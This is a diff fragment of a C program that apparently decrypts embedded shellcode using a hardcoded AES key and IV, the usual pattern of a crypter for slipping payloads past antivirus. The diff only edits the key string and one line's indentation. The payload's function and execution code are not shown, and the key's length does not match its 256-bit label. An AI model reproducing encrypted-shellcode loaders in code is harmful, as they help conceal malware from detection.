@@ -16,14 +16,14 @@ void print_shellcode(unsigned char *shellcode) {
 
 int main(int argc, char *argv[]) {
     // 256 bit key
-    unsigned char *key = "424b1e9083e83b822ac7dbeb47be5f7d424b1e9083e83b822ac7dbeb47be5f7d424b1e9083e83b822ac7dbeb47be5f7";
+    unsigned char *key = "424b1e9083e83b822ac7dbeb47be5f7d424b1e9083e83b822ac7dbeb47be5f7d424b1e9083e83b822ac7dbeb4";
 
     // 128 bit IV
     unsigned char *iv = "01123481321345514";
 
     // Encrypted shellcode
     unsigned char *encrypted_shellcode =
-       					"\xd1\x9d\x6f\x0f\x07\x68\xb8\x3a\x51\x72\x21\x30\x6a\x16\xe7\x2d"
+       							"\xd1\x9d\x6f\x0f\x07\x68\xb8\x3a\x51\x72\x21\x30\x6a\x16\xe7\x2d"
 								"\xc2\x39\x91\x45\x58\xdd\x54\xf6\xc1\x75\xb4\x1c\x59\x0a\xb4\xac"
 								"\xff\x24\x3f\xb1\xfc\xfe\xd3\xe5\xd4\x55\xbb\x55\x4c\xcc\xf5\xeb"
 								"\xac\x93\xe6\x5d\xe6\xf1\xfa\x1a\x1d\x6a\xf5\x9d\xcf\x45\x77\x2a"
